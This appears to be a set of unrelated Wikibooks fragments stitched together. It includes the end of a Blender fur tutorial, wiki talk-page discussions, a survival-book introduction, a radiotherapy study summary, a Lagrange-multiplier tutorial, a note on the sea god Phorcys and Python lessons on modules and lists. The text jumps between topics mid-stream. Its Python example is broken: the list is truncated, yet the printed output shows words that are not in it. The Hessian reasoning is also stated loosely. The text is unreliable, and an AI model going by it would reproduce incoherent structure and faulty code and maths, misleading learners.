[[File:Blender3D FurWithParticles-ParticleLengthTexture-2.48a.jpg|thumb|300px|'''Figure 4d:''' Controlling particles with a texture: result]]
The result is shown in '''Fig.&amp;nbsp;4d''', you can also see the particles change in the 3D window.

There would have been other ways to achieve this result, e.g. with vertex groups or with particle editing. But I like to work with textures, because you have very fine control and may change the strength of the effect at any time. Vertex groups don't allow for such fine control or you need very many vertices in the emitter. Particle editing (what we will do in the next step) is lost if you change the base particle settings late on, and you can't change it's effect so easily. 

{{clr}}

== Comb it! ==
[[File:Blender3D FurWithParticles-Combing-2.48a.png|framed|'''Figure 5a:''' Combing in ''Particle Mode'']]

An effect that is often underestimated is the importance to comb fur in the natural directions. Fur doesn't simply stand upright, and it also doesn't follow gravity (or only to a small amount). So back to the particle system!

* Change back to the ''Particle buttons''. 
* Click on ''Set Editable'' in the ''Particle System'' panel.
* Change to ''Particle Mode''.
''Particle Mode'' only appears if you have made the particle system editable, and only hair systems can be made editable.
There are a few lifesavers to know when working in ''Particle Mode''.
:- you can edit only the control points (remember the setting ''Segments'' from the beginning of this tutorial)
:- you can only edit parent particles, so you need enough parents for good control
* Activate ''Limit selection to visible'' 
* Activate ''Point select mode'' for even finer control.
Both settings are in the window header of the 3D window. 
* Open the ''Particle Edit Properties'' panel with '''N''' key in the 3D window.
* Select ''Comb''.
You have quite a few different tools at hand in ''Particle Mode'', see the [http://wiki.blender.org/index.php/Doc:Manual/Physics/Particle_Mode manual on Particle Mode]. 
* Comb the hair following the natural flow.

On the example sphere I have used here it is a bit difficult to tell what the natural flow should be ;-). So I have just very carefully combed and changed the length at a few places a bit. You find the rendered result in '''Fig.&amp;nbsp;1''', the Blend file is linked below.

      <text xml:space="preserve">== New version March 2009 ==
I' will try and update the tutorial for v2.48a. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 11:55, 20 March 2009 (UTC)

== The eyes and mouth ==

HElp!Did this happen to anyone else? when i finished the painting for the mouth and eyes, on the render, the hair is gone and i am left with ha blank spot where they should be, but The background, like the color of the emitter is the same zebra pattern, can anyone tell me why this happens? I use 2.49a
== Lost and... lost ==
Maybe it's because of v2.49b, or I'm an utter newbie, but I ended up in a total mess.  I Managed to load the zebra!!! But it was tiled. Wasn't I working on another texture and material when I loaded the stripy horse flesh... I'll never know.  Painting the face? How...I had a big zebra crossing in the way.  Needs to be a little more newbie friendly but... maybe I was tired and missed something.

== PAttr ==

I'm using Blender version 2.49b (current stable). When trying to modify the hair length with a texture, I am told to activate the PAttr button in the Map To tab. However, this button doesn't appear to be there. Does anyone have a suggestion on this? --[[User:Erispre|Erispre]] ([[User talk:Erispre|talk]]) 17:20, 27 November 2009 (UTC)

Solved: It appears I have not correctly applied the materials. Precisely following the instructions works perfectly well. --[[User:Erispre|Erispre]] ([[User talk:Erispre|talk]]) 18:19, 27 November 2009 (UTC)

== Texture ==
Somebody wrote:
: ''(noob note): I'm trying to follow you on this, but you just say &quot;add a second texture&quot; what texture should I add?  The image you show for the rest of the steps doesn't seem to match up with any of the options I can select.''
:: First you add a texture, without choosing it's type. Than you set the material options for the texture. And a last you select an actual texture, here a blend-texture. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 16:18, 9 December 2009 (UTC)

== Using a texture to create the face/pattern ==
I tried this bit multiple times and never got it to work.  There is a lot of switching materials and textures, none of which is very clear to me.  I've worked my way through the whole book and this is the first part I absolutely cannot get to work.  I simply don't get why I'm doing the things I'm told to, and they don't seem to work in the end anyway.  Why did I create a second material after &quot;fur&quot; in object buttons and then go to materials buttons only to delete the data block link to it?  Then create a new material there and name it &quot;emitter&quot;?  I'm totally clueless.  Then switch back to fur and create a new texture, &quot;furlength&quot; with no type but map input UV and map to the Particle Attribute stuff?  Lost... (2.49b)--[[User:WithAlligators|WithAlligators]] ([[User talk:WithAlligators|talk]]) 22:08, 4 March 2010 (UTC)

It's true, the step seems redunant, but you should follow the steps as provided. I have just completed the Tutorial with pretty good success. The face is a doozy but things to remember:

Emitter = The UV sphere you build.
If you never rename it, fine, but make sure it that whatever it is called, it is linked to. Image 3A is hiding the OB entry, but make sure that has the OB sphere or whatever named in it. 

I have now a brushed version of picture 4.D, but cannont get the final image with the orange eye's &amp; mouth. That part is proving elusive.
(2.49b)--[[User:Naxius|Naxius]] ([[User talk:Naxius|talk]])15:13, 10 March 2011 (+10GMT)

== Strand colour ==

The article says you can change the strand colour differently to the face colour but how?

I think what you have to do is apply the texture of the strand as described in the tutorial, then go into editmode, select the vertices of the emitter, make another material, and apply it to the emitter.

== Could we get an update? ==

Blender has changed a lot in the past few years, so maybe it's time to update this page.  It's rather confusing and frustrating for a new user to look at this page and try to understand what the original author was trying to say.

      <text xml:space="preserve">This page is in serious need of attention.  I have gone through and tried to make at least some of the TeX code parse correctly. But I have run out of energy for this today.   Here are some problems that still  exist on this page.  
#Lots of TeX code outside &lt;nowiki&gt;&lt;math&gt; &lt;/math&gt;&lt;/nowiki&gt; tags.
#When there are &lt;nowiki&gt;&lt;math&gt; &lt;/math&gt;&lt;/nowiki&gt; they get used incorrectly, often as parenthesis. Causing strange display problems.
#TeX style quotation marks are often used outide of math environments (that is &lt;nowiki&gt;`` and ''&lt;/nowiki&gt;)  which lead to strange italics.
#There are some mathematical errors throughout.  
#When specifying sets often there is simply a { instead of \{ so the braces don't appear.  The arrow symbol is used as the set builder &quot;such that&quot; so for example the set of integers greater then five may be type set as &lt;math&gt;{a\in\mathbb{N}\to a&gt;5}&lt;/math&gt; instead of &lt;math&gt;\{a\in\mathbb{N}\mid a&gt;5\}&lt;/math&gt; or &lt;math&gt;\{a\in\mathbb{N} : a&gt;5\}&lt;/math&gt;.
#Nonstandard tex commands are used so they fail to parse, as the cleanup tag currently points out.  I have decided that \polyspace should just become a capital ''P''.  There are also things like &quot;\map{f}{N}{R}&quot; for &quot;f:N\to R&quot; and &quot;\nbym{2}{3}&quot; for &quot;2\times 3&quot;. 
#There are a few places where the grammer is questionable.

I'm fuzzy on this whole topic, but I think the current policy, is that you should license your own work under GFDL and a CC license (I forget which one).

&quot;These images contain things like grids (in 3D view)&quot;

I don't see how a grid by itself is [[commons:template:PD-ineligible|original enough]] to attach Blender's copyright to an image cropped to show only the 3D view. --[[User:Damian Yerrick|Damian Yerrick]] ([[User talk:Damian Yerrick|talk]]) 20:48, 23 July 2010 (UTC)</text>

== Introduction ==

Modern civilization is quite advanced with the advent of industrial manufacturing, electricity, and the free flow of information.  A lot can be accomplished to a degree that trivializes [[The Seven Wonders of the World]], with feats of knowledge, science and engineering.  The technology also aids our modern lives, making us more productive and powerful than before.

The technology comes at great cost - if access to it is removed, society will be severely crippled with no effective means of production or sustenance.  While most civilians in this environment have experienced a temporary loss through power brownouts and blackouts, there has not been one on a more permanent scale.  

The causes for the loss range from a resource loss (such as generation of electrical power), to something drastic (such as being stranded on an island or different planet and having no rescue), to violent (such as global warfare, with or without nuclear weaponry.)  In each of these three scenarios, you may or may not have access to supplies or pre-loss technology.  

The objective of this book is to provide a method to recover from the loss and rebuild civilization.  The difficulty for this will vary - you may have access to resources and arable land, or you may instead have to make due within a desert.  Survival is usually possible as long as you can produce or collect enough food on a yearly basis; however, the secret on thriving is learning how to rebuild or replace the lost technology.

**Retrospective. 56 patients (H&amp;N 87%), high risk disease (recurrent 52%, cervical LNs, lymph nodes &gt;3cm, &gt;3 LN+, ECE, gross residual disease, close/positive SM, satellitosis), treated with adjuvant RT. Hypofractionated RT 30/5 (73%) or conventional with median dose 60/30 (27%). Median F/U 4.4 years
**Outcome: 5-year LRC 87%, CSS 57%, OS 46%. No difference between schedules (p=0.97) for any endpoint
**Toxicity: late toxicity 4% (1 osteoradionecrosis of external auditory canal, 1 radiation plexopathy), both in hypofractionated regimens
**Conclusion: Hypofractionation and conventional fractionation equally efficacious. Bias for hypofractionation in absence of contraindications

A key application of calculus is in optimization: finding maximum and minimum values of a function, and which points realize these extrema.

=== Context ===
Formally, the field of mathematical optimization is called ''mathematical programming,'' and calculus methods of optimization are basic forms of [[w:nonlinear programming|nonlinear programming]]. We will primarily discuss finite-dimensional optimization, illustrating with functions in 1 or 2 variables, and algebraically discussing ''n'' variables.
We will also indicate some extensions to [[w:infinite-dimensional optimization|infinite-dimensional optimization]], such as [[w:calculus of variations|calculus of variations]], which is a primary application of these methods in physics.

=== Techniques ===
Basic techniques include the first and second derivative test, and their higher-dimensional generalizations.

A more advanced technique is Lagrange multipliers, and generalizations as Karush–Kuhn–Tucker conditions and Lagrange multipliers on Banach spaces.

=== Applications ===
Optimization, particularly via Lagrange multipliers, is particularly used in the following fields:
* Physics
** Particularly the Lagrangian formulation of classical mechanics.
* [[w:Neoclassical economics|Neoclassical economics]]
** In neoclassical economics, many problems have been framed as maximization problems following the very influential 1947 text ''[[w:Foundations of Economic Analysis|Foundations of Economic Analysis]],'' by [[w:Paul Samuelson|Paul Samuelson]].

Further, several areas of mathematics can be understood as generalizations of these methods, notably [[w:Morse theory|Morse theory]] and [[w:calculus of variations|calculus of variations]].

=== Terminology ===
* Input points, output values
* Maxima, minima, extrema, optima
* Stationary point, critical point; stationary value, critical value
* Objective function

* Constraints – equality and inequality
** Especially sublevel sets
** Feasible region, whose points are candidate solutions

== Statement ==
This tutorial presents an introduction to optimization problems that involve finding a maximum or a minimum value of an [[w:Optimization (mathematics)|objective function]] &lt;math&gt;f(x_1,x_2,\ldots, x_n)&lt;/math&gt; subject to a constraint of the form &lt;math&gt;g(x_1,x_2,\ldots, x_n)=k&lt;/math&gt;.

==Maximum and minimum==
Finding optimum values of the function &lt;math&gt; f(x_1,x_2,\ldots, x_n)&lt;/math&gt; without a constraint is a well known problem dealt with in calculus courses. One would normally use the gradient to find [[w:stationary point|stationary point]]s. Then check all stationary and [[w:Boundary (topology)|boundary points]] to find optimum values.

===Example===
* &lt;math&gt; f(x,y)=2x^2+y^2 &lt;/math&gt;
* &lt;math&gt; f_x(x,y)=4x=0 &lt;/math&gt;
* &lt;math&gt; f_y(x,y)=2y=0 &lt;/math&gt;
&lt;math&gt;f(x,y)&lt;/math&gt; has one stationary point at (0,0).

==The Hessian==
A common method of determining whether or not a function has an [[w:extreme value|extreme value]] at a stationary point is to evaluate the hessian of the function at that point. where the [[w:Hessian matrix|hessian]] is defined as

: &lt;math&gt;H(f)= \begin{bmatrix}
\frac{{\partial}^2 f}{\partial x_1^2} &amp; \frac{{\partial}^2 f}{\partial x_1 \partial x_2} &amp; \dots &amp; \frac{{\partial}^2 f}{\partial x_1 \partial x_n} \\
\frac{{\partial}^2 f}{\partial x_2 \partial x_1} &amp; \frac{{\partial}^2f}{\partial x_2^2}&amp; \dots &amp; \frac{{\partial}^2f}{\partial x_2 \partial x_n}\\
\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
\frac{{\partial}^2f}{\partial x_n \partial x_1} &amp; \frac{{\partial}^2f}{\partial x_n \partial x_2}&amp; \dots &amp; \frac{{\partial}^2f}{\partial x_n^2}\\
\end{bmatrix}. &lt;/math&gt;

==Second derivative test==
The [[w:Derivative|Second derivative]] test determines the optimality of stationary point &lt;math&gt;x&lt;/math&gt; according to the following rules [2]:
* If &lt;math&gt;H(f)&gt;0 &lt;/math&gt; at point x then &lt;math&gt;f&lt;/math&gt; has a [[w:Maxima and minima|local minimum]] at x
* If &lt;math&gt; H(f) &lt; 0 &lt;/math&gt; at point x then &lt;math&gt;f&lt;/math&gt; has a local maximum at x
* If &lt;math&gt; H(f) &lt;/math&gt; has negative and positive eigenvalues then x is a [[saddle point]]
* Otherwise the test is inconclusive
In the above example.

: &lt;math&gt; H(f)=\begin{bmatrix}
4 &amp; 0\\
0&amp; 2
\end{bmatrix}. &lt;/math&gt;

Therefore &lt;math&gt;f(x,y)&lt;/math&gt; has a minimum at (0,0).

      <comment>H(L) was zero before ! It had zero raw</comment>
      <text xml:space="preserve">The method of Lagrange multipliers solves the constrained optimization problem by transforming it into a non-constrained optimization problem of the form:
* &lt;math&gt;\operatorname{\mathcal{L}}(x_1,x_2,\ldots, x_n,\lambda)= \operatorname{f}(x_1,x_2,\ldots, x_n)+\operatorname{\lambda}(k-g(x_1,x_2,\ldots, x_n))&lt;/math&gt;
Then finding the gradient and hessian as was done above will determine any optimum values of &lt;math&gt;\operatorname{\mathcal{L}}(x_1,x_2,\ldots, x_n,\lambda)&lt;/math&gt;.

Suppose we now want to find optimum values for &lt;math&gt;f(x,y)=2x^2+y^2&lt;/math&gt; subject to &lt;math&gt;x+y=1&lt;/math&gt; from [2].

Then the Lagrangian method will result in a non-constrained function.
* &lt;math&gt;\operatorname{\mathcal{L}}(x,y,\lambda)= 2x^2+y^2+\lambda (1-x-y)&lt;/math&gt;

The gradient for this new function is
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial x}(x,y,\lambda)= 4x+\lambda (-1)=0&lt;/math&gt;
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial y}(x,y,\lambda)= 2y+\lambda (-1)=0&lt;/math&gt;
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial \lambda}(x,y,\lambda)=1-x-y=0&lt;/math&gt;

Finding the stationary points of the above equations can be obtained from their matrix from.

: &lt;math&gt; \begin{bmatrix}
4 &amp; 0 &amp; -1 \\
0&amp; 2 &amp; -1 \\
-1 &amp; -1 &amp; 0
\end{bmatrix} \begin{bmatrix}
x\\
y \\
\lambda \end{bmatrix}= \begin{bmatrix}
0\\
0\\
-1
\end{bmatrix}
&lt;/math&gt;

This results in &lt;math&gt;x=1/3, y=2/3, \lambda=4/3&lt;/math&gt;.

Next we can use the hessian as before to determine the type of this stationary point.

: &lt;math&gt; H(\mathcal{L})=
 \begin{bmatrix}
4 &amp; 0 &amp; -1 \\
0&amp; 2 &amp; -1 \\
-1&amp;-1&amp;0
\end{bmatrix}
&lt;/math&gt;

Since &lt;math&gt; H(\mathcal{L}) &gt;0 &lt;/math&gt; then the solution &lt;math&gt;(1/3,2/3,4/3)&lt;/math&gt; minimizes &lt;math&gt;f(x,y)=2x^2+y^2&lt;/math&gt; subject to &lt;math&gt;x+y=1&lt;/math&gt; with &lt;math&gt;f(x,y)=2/3&lt;/math&gt;.

      <text xml:space="preserve">Phorcys was a primeval Greek Sea god. He was said to be the son of Pontus and Gaia. His wife was Ceto, and it was said that all the children they had were monsters. Their children were known as the Phorcydes which included the Gorgons and Scylla. Phorcys is depicted as a fish-tailed Merman.

...I've been mulling over for some time now: who here would be interested in contributing to a book (specifically a collection of interviews) conducted with Protestant clergy?  The questions would be set.....pre-determined, but contributors would have to conduct face-to-face interviews.....and contribute verbatim transcripts here. Any takers?

      <text xml:space="preserve">==Copyright?==
It always makes me suspicious when I see an anonymous user post 300K of text with very few edits.  It usually means the editor is doing a cut and paste from a copyrighted resource, but it is possible that the author has written the text offline and ''then'' pasted it into Wikibooks.  I have been unable to find anything on the web that this may have been taken from, so I have taken no action other than to request clarification.

Where did this text come from?  Please understand that we cannot accept copyrighted materials here unless we have permission from the author(s). Please respond in the next couple of days, or this text may be deleted from Wikibooks. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 13:22, 22 March 2009 (UTC)
:Right, the text is being authored offline and then pasted into Wikibooks.&lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:41.240.92.235|41.240.92.235]] ([[User talk:41.240.92.235|talk]] • [[Special:Contributions/41.240.92.235|contribs]]) 19:02, April 2, 2009.&lt;/small&gt;

== Who can Edit ==

Looking at some of the recent history of this work:
{|border=1 cellspacing=1 cellpadding=5
|-
|''This volume on Psychiatry is currently in the initial stages of development. Initial material has been sourced from Wikipedia. ''
|}

:In order for the GFDL to be properly respected (and therefore, for the inclusion of material licensed under the GFDL to be legal), we need to from know which Wikipedia articles this was drawn.  We can then do an edit history merge so that proper attribution can be made.

{|border=1 cellspacing=1 cellpadding=5
|-
|This volume on Psychiatry is currently in the initial stages of development. Contributions to date have, however, been made by experts in their fields (see below). Feel free to contact them with suggestions for change, but please do not make edits yourself. 
|}
This flies in the face of the policies we have here at Wikibooks.  The very first sentence of our [[Main page|front page]] says that &quot;anyone can edit&quot; the books developed here.  If you are not willing to allow others to make edits, you should probably look for a different wiki to host this material. 

--[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:18, 23 March 2009 (UTC)

:I have to admit to being new at this.  However, my impression was that some of the textbooks do allow for assignment of authors.  What other wikis would be more appropriate to host this material? &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:41.240.92.235|41.240.92.235]] ([[User talk:41.240.92.235|talk]] • [[Special:Contributions/41.240.92.235|contribs]]) .&lt;/small&gt;
::Part of what makes Wikibooks work is that ''anyone'' can edit any page (or as close to that as we can get). By restricting who can edit, you lose the whole point of a wiki. I'll simply remove the text noted above &amp; we will allow anyone to edit. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 22:10, 2 April 2009 (UTC)

:OK, fair enough.  Thank you, however, for retaining the author names.  I think this is important for several reasons.  First, readers, particularly practising clinicians, want to be assured of the expertise of the authors.  Second, writers, particularly those in academia, want some acknowledgement of their contributions.  It will be interesting so see the quality of future edits, and whether authors are happy with these.

== Need to split into chapters ==

This book desperately needs to be split into chapters.  If you need help doing this, don't hesitate to ask. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 19:39, 31 March 2009 (UTC)

      <text xml:space="preserve">Here's this chapter's typing exercise (name it cal.py (&lt;code&gt;import&lt;/code&gt; actually looks for a file named calendar.py and reads it in.  If the file is named calendar.py and it sees a &quot;import calendar&quot; it tries to read in itself which works poorly at best.)):

&lt;source lang=&quot;python&quot;&gt;
import calendar
year = int(input(&quot;Type in the year number: &quot;))
calendar.prcal(year)
&lt;/source&gt;

And here is part of the output I got:

 Type in the year number: 2001
 
                                  2001

(I skipped some of the output, but I think you get the idea.) So what does the program do?  The first line &lt;code&gt;import calendar&lt;/code&gt; uses a new command &lt;code&gt;import&lt;/code&gt;.  The command &lt;code&gt;import&lt;/code&gt; loads a module (in this case the &lt;code&gt;calendar&lt;/code&gt; module).  To see the commands available in the standard modules either look in the library reference for python (if you downloaded it) or go to http://docs.python.org/library/.  If you look at the documentation for the calendar module, it lists a function called &lt;code&gt;prcal&lt;/code&gt; that prints a calendar for a year.  The line &lt;code&gt;calendar.prcal(year)&lt;/code&gt; uses this function.  In summary to use a module &lt;code&gt;import&lt;/code&gt; it and then use &lt;code&gt;module_name.function&lt;code&gt; for functions in the module.  Another way to write the program is:

&lt;source lang=&quot;python&quot;&gt;
from calendar import prcal

year = int(input(&quot;Type in the year number: &quot;))
prcal(year)
&lt;/source&gt; 

This version imports a specific function from a module.  Here is another program that uses the Python Library (name it something like clock.py) (press Ctrl and the 'c' key at the same time to terminate the program):

&lt;source lang=&quot;python&quot;&gt;
from time import time, ctime

prev_time = &quot;&quot;
while True:
    the_time = ctime(time())
    if prev_time != the_time:
        print(&quot;The time is:&quot;, ctime(time()))
        prev_time = the_time
&lt;/source&gt;

With some output being:

 The time is: Sun Aug 20 13:40:04 2000
 The time is: Sun Aug 20 13:40:05 2000
 The time is: Sun Aug 20 13:40:06 2000
 The time is: Sun Aug 20 13:40:07 2000
 
 Traceback (innermost last):
  File &quot;clock.py&quot;, line 5, in ?
     the_time = ctime(time())
 
 KeyboardInterrupt

The output is infinite of course so I canceled it (or the output at least continues until Ctrl+C is pressed).  The program just does a infinite loop (&lt;code&gt;True&lt;/code&gt; is always true, so &lt;code&gt;while True:&lt;/code&gt; goes forever) and each time checks to see if the time has changed and prints it if it has.  Notice how multiple names after the import statement are used in the line &lt;code&gt;from time import time, ctime&lt;/code&gt;.  

The Python Library contains many useful functions.  These functions give your programs more abilities and many of them can simplify programming in Python.

=== Exercises ===
Rewrite the &lt;code&gt;high_low.py&lt;/code&gt; program from section [[../Decisions#Examples|Decisions]] to use an random integer between 0 and 99 instead of the hard-coded 78. Use the Python documentation to find an appropriate module and function to do this.

      <text xml:space="preserve">We have already seen lists and how they can be used.   Now that you have some more background I will go into more detail about lists.  First we will look at more ways to get at the elements in a list and then we will talk about copying them.  

Here are some examples of using indexing to access a single element of a list:

 &gt;&gt;&gt; '''some_numbers = ['zero', 'one', 'two', 'three', 'four', 'five']'''
 &gt;&gt;&gt; '''some_numbers[0]'''
 'zero'
 &gt;&gt;&gt; '''some_numbers[4]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[5]'''
 'five'

All those examples should look familiar to you.  If you want the first item in the list just look at index 0.  The second item is index 1 and so on through the list.  However what if you want the last item in the list?  One way could be to use the &lt;code&gt;len()&lt;/code&gt; function like &lt;code&gt;some_numbers[len(some_numbers) - 1]&lt;/code&gt;.  This way works since the &lt;code&gt;len()&lt;/code&gt; function always returns the last index plus one.  The second from the last would then be &lt;code&gt;some_numbers[len(some_numbers) - 2]&lt;/code&gt;.  There is an easier way to do this.  In Python the last item is always index -1.  The second to the last is index -2 and so on.  Here are some more examples:

 &gt;&gt;&gt; '''some_numbers[len(some_numbers) - 1]'''
 'five'
 &gt;&gt;&gt; '''some_numbers[len(some_numbers) - 2]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[-1]'''
 'five'
 &gt;&gt;&gt; '''some_numbers[-2]'''
 'four'
 &gt;&gt;&gt; '''some_numbers[-6]'''
 'zero'

Thus any item in the list can be indexed in two ways: from the front and from the back.

Another useful way to get into parts of lists is using slicing.  Here is another example to give you an idea what they can be used for:

 &gt;&gt;&gt; '''things = [0, 'Fred', 2, 'S.P.A.M.', 'Stocking', 42, &quot;Jack&quot;, &quot;Jill&quot;]'''
 &gt;&gt;&gt; '''things[0]'''
 0
 &gt;&gt;&gt; '''things[7]'''
 'Jill'
 &gt;&gt;&gt; '''things[0:8]'''
 [0, 'Fred', 2, 'S.P.A.M.', 'Stocking', 42, 'Jack', 'Jill']
 &gt;&gt;&gt; '''things[2:4]'''
 [2, 'S.P.A.M.']
 &gt;&gt;&gt; '''things[4:7]'''
 ['Stocking', 42, 'Jack']
 &gt;&gt;&gt; '''things[1:5]'''
 ['Fred', 2, 'S.P.A.M.', 'Stocking']

Slicing is used to return part of a list.  The slicing operator is in the form &lt;code&gt;things[first_index:last_index]&lt;/code&gt;.  Slicing cuts the list before the &lt;code&gt;first_index&lt;/code&gt; and before the &lt;code&gt;last_index&lt;/code&gt; and returns the parts in between.  You can use both types of indexing:

 &gt;&gt;&gt; '''things[-4:-2]'''
 ['Stocking', 42]
 &gt;&gt;&gt; '''things[-4]'''
 'Stocking'
 &gt;&gt;&gt; '''things[-4:6]'''
 ['Stocking', 42]

Another trick with slicing is the unspecified index.  If the first index is not specified the beginning of the list is assumed.  If the last index is not specified the whole rest of the list is assumed.  Here are some examples:

 &gt;&gt;&gt; '''things[:2]'''
 [0, 'Fred']
 &gt;&gt;&gt; '''things[-2:]'''
 ['Jack', 'Jill']
 &gt;&gt;&gt; '''things[:3]'''
 [0, 'Fred', 2]
 &gt;&gt;&gt; '''things[:-5]'''
 [0, 'Fred', 2]

Here is a (HTML inspired) program example (copy and paste in the poem definition if you want):
&lt;source lang=&quot;python&quot;&gt;
poem = [&quot;&lt;B&gt;&quot;, &quot;Jack&quot;, &quot;and&quot;, &quot;Jill&quot;, &quot;&lt;/B&gt;&quot;, &quot;went&quot;, &quot;up&quot;, &quot;the&quot;,

        &quot;&lt;/B&gt;&quot;, &quot;tumbling&quot;, &quot;after&quot;]

def get_bolds(text):
    true = 1
    false = 0
    ## is_bold tells whether or not we are currently looking at 
    ## a bold section of text.
    is_bold = false
    ## start_block is the index of the start of either an unbolded 
    ## segment of text or a bolded segment.
    start_block = 0
    for index in range(len(text)):
        ## Handle a starting of bold text
        if text[index] == &quot;&lt;B&gt;&quot;:
            if is_bold:
                print(&quot;Error: Extra Bold&quot;)
            ## print &quot;Not Bold:&quot;, text[start_block:index]
            is_bold = true
            start_block = index + 1
        ## Handle end of bold text
        ## Remember that the last number in a slice is the index 
        ## after the last index used.
        if text[index] == &quot;&lt;/B&gt;&quot;:
            if not is_bold:
                print(&quot;Error: Extra Close Bold&quot;)
            print(&quot;Bold [&quot;, start_block, &quot;:&quot;, index, &quot;]&quot;, text[start_block:index])
            is_bold = false
            start_block = index + 1

get_bolds(poem)
&lt;/source&gt;

with the output being:

 Bold [ 1 : 4 ] ['Jack', 'and', 'Jill']
 Bold [ 11 : 15 ] ['fetch', 'a', 'pail', 'of']
 Bold [ 20 : 23 ] ['down', 'and', 'broke']
 Bold [ 28 : 30 ] ['Jill', 'came']

The &lt;code&gt;get_bold()&lt;/code&gt; function takes in a list that is broken into words and tokens.  The tokens that it looks for are &lt;code&gt;&amp;lt;B&amp;gt;&lt;/code&gt; which starts the bold text and &lt;code&gt;&amp;lt;/B&amp;gt;&lt;/code&gt; which ends bold text. The function &lt;code&gt;get_bold()&lt;/code&gt; goes through and searches for the start and end tokens.

The next feature of lists is copying them.  If you try something simple like:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a'''
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''b[1] = 10'''
 &gt;&gt;&gt; '''print(b)'''
 [1, 10, 3]
 &gt;&gt;&gt; '''print(a)'''
 [1, 10, 3]

This probably looks surprising since a modification to &lt;code&gt;b&lt;/code&gt;
resulted in &lt;code&gt;a&lt;/code&gt; being changed as well.  What happened is that the
statement &lt;code&gt;b = a&lt;/code&gt; makes &lt;code&gt;b&lt;/code&gt; a ''reference'' to &lt;code&gt;a&lt;/code&gt;.
This means that &lt;code&gt;b&lt;/code&gt; can be thought of as another name for &lt;code&gt;a&lt;/code&gt;.
Hence any modification to &lt;code&gt;b&lt;/code&gt; changes &lt;code&gt;a&lt;/code&gt; as well.  However
some assignments don't create two names for one list:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a * 2'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3, 1, 2, 3]
 &gt;&gt;&gt; '''a[1] = 10'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 10, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 2, 3, 1, 2, 3]

In this case &lt;code&gt;b&lt;/code&gt; is not a reference to &lt;code&gt;a&lt;/code&gt; since the expression &lt;code&gt;a * 2&lt;/code&gt; creates a new list. Then the statement
&lt;code&gt;b = a * 2&lt;/code&gt; gives &lt;code&gt;b&lt;/code&gt; a reference to &lt;code&gt;a * 2&lt;/code&gt; rather than a reference to &lt;code&gt;a&lt;/code&gt;.  All assignment operations create a reference.
When you pass a list as an argument to a function you create a
reference as well.  Most of the time you don't have to worry about
creating references rather than copies.  However when you need to make
modifications to one list without changing another name of the list
you have to make sure that you have actually created a copy.

There are several ways to make a copy of a list.  The simplest that
works most of the time is the slice operator since it always makes a
new list even if it is a slice of a whole list:

 &gt;&gt;&gt; '''a = [1, 2, 3]'''
 &gt;&gt;&gt; '''b = a[:]'''
 &gt;&gt;&gt; '''b[1] = 10'''
 &gt;&gt;&gt; '''print(a)'''
 [1, 2, 3]
 &gt;&gt;&gt; '''print(b)'''
 [1, 10, 3]

Taking the slice &lt;code&gt;[:]&lt;/code&gt; creates a new copy of the list. However it only copies the outer list.  Any sublist inside is still a references to the sublist in the original list.  Therefore, when the list contains lists, the inner lists have to be copied as well.  You could do that manually but Python already contains a module to do it.  You use the &lt;code&gt;deepcopy&lt;/code&gt; function of the &lt;code&gt;copy&lt;/code&gt; module:

 &gt;&gt;&gt; '''import copy'''
 &gt;&gt;&gt; '''a = [[1, 2, 3], [4, 5, 6]]'''
 &gt;&gt;&gt; '''b = a[:]'''
 &gt;&gt;&gt; '''c = copy.deepcopy(a)'''
 &gt;&gt;&gt; '''b[0][1] = 10'''
 &gt;&gt;&gt; '''c[1][1] = 12'''
 &gt;&gt;&gt; '''print(a)'''
 [[1, 10, 3], [4, 5, 6]]
 &gt;&gt;&gt; '''print(b)'''
 [[1, 10, 3], [4, 5, 6]]
 &gt;&gt;&gt; '''print(c)'''
 [[1, 2, 3], [4, 12, 6]]

First of all notice that &lt;code&gt;a&lt;/code&gt; is a list of lists.  Then notice
that when &lt;code&gt;b[0][1] = 10&lt;/code&gt; is run both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are changed, but &lt;code&gt;c&lt;/code&gt; is not.  This happens because the inner arrays are still references when the slice operator is used.  However with &lt;code&gt;deepcopy&lt;/code&gt; &lt;code&gt;c&lt;/code&gt; was fully copied.

So, should I worry about references every time I use a function or
&lt;code&gt;=&lt;/code&gt;?  The good news is that you only have to worry about
references when using dictionaries and lists.  Numbers and strings
create references when assigned but every operation on numbers and
strings that modifies them creates a new copy so you can never modify
them unexpectedly.  You do have to think about references when you are
modifying a list or a dictionary.

By now you are probably wondering why are references used at all?  The
basic reason is speed.  It is much faster to make a reference to a
thousand element list than to copy all the elements.  The other reason
is that it allows you to have a function to modify the inputed list
or dictionary.  Just remember about references if you ever have some
weird problem with data being changed when it shouldn't be.

      <text xml:space="preserve">== Presentation ==
There are two main ways to present a subset of &lt;math&gt;\mathbf{R}^n&lt;/math&gt; – '''explicitly''' and '''implicitly.'''

